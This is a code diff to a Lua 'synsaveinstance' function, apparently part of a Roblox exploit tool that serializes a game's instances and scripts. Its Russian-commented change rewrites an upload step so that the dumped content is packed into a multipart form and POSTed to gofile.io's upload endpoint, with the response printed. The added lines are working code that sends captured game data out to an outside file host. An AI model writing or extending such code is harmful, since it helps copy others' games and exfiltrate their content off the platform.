@@ -4075,32 +4075,31 @@ local function synsaveinstance(CustomOptions, CustomOptions2)
 					totallen += math.ceil(#chunk / SEGMENT_SIZE)
 				end
 
-				print(2.52)
+				print(2.55)
 
-				local success, serverRequest__funpayjust82jeow = pcall(function()
- 				   return game:GetService("HttpService"):RequestAsync({
- 				     Url = "https://gofile.io",
-   				     Method = "GET"
-  				  })
-				end)
-
-				print(success)
-				print(serverRequest__funpayjust82jeow)
-				
-				--local serverData__funpayjust82jeow = game:GetService("HttpService"):JSONDecode(serverRequest__funpayjust82jeow.Body)
-				
 				if true then
-				    --local serverName__funpayjust82jeow = serverData__funpayjust82jeow.data.server
-				    
-				    local uploadRequest__funpayjust82jeow = request({
-				        Url = "https://gofile.io",
-				        Method = "POST",
-				        Headers = {
-				            ["Content-Type"] = "multipart/form-data"
-				        },
-				        -- The 'Body' parameter will send the file contents
-				        Body = buildFinalString(chunks)
-				    })
+					-- Генерируем уникальный разделитель для multipart формы
+					local boundary = "----LuaWebkitFormBoundary" .. tostring(math.random(100000, 999999))
+					
+					-- Формируем правильное тело Multipart, упаковывая код файла в поле "file"
+					local fileContent = buildFinalString(chunks)
+					local bodyStructure = 
+					    "--" .. boundary .. "\r\n" ..
+					    "Content-Disposition: form-data; name=\"file\"; filename=\"script.lua\"\r\n" ..
+					    "Content-Type: text/plain\r\n\r\n" ..
+					    fileContent .. "\r\n" ..
+					    "--" .. boundary .. "--\r\n"	
+
+					local uploadRequest__funpayjust82jeow = request({
+					    Url = "https://upload.gofile.io/uploadfile", -- Используем правильный эндпоинт API
+					    Method = "POST",
+					    Headers = {
+					        -- Обязательно указываем созданный boundary в заголовок типа контента
+					        ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
+					    },
+					    Body = bodyStructure
+					})
+
 				    
 				    print("Upload Response:", uploadRequest__funpayjust82jeow.Body)
 				end
